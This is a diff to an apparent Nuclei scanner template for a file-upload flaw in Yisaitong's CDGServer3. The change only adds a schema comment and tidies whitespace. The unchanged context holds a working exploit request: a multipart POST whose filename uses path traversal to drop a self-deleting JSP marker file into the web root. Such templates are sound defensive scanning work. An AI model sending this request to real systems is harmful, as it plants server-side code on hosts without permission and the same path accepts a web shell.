@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: yisaitong-UploadFileFromClientServiceForClient-fileUpload
 
 info:
@@ -13,14 +14,14 @@ http:
   - method: POST
     path:
       - "{{BaseURL}}/CDGServer3/fileType/importFileType.do?flag=syn_user_policy"
-    
-    headers: 
+
+    headers:
       Content-Type: "multipart/form-data; boundary=a6c1544109e610dc4bddfc7583725f9c"
 
     body: |
       --a6c1544109e610dc4bddfc7583725f9c
       Content-Disposition: form-data; name="fileshare"; filename="/..\\..\\..\\..\\webapps\\ROOT\\{{r1}}.jsp
-      
+
       "<%out.print("{{r2}}");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
       --a6c1544109e610dc4bddfc7583725f9c--
 
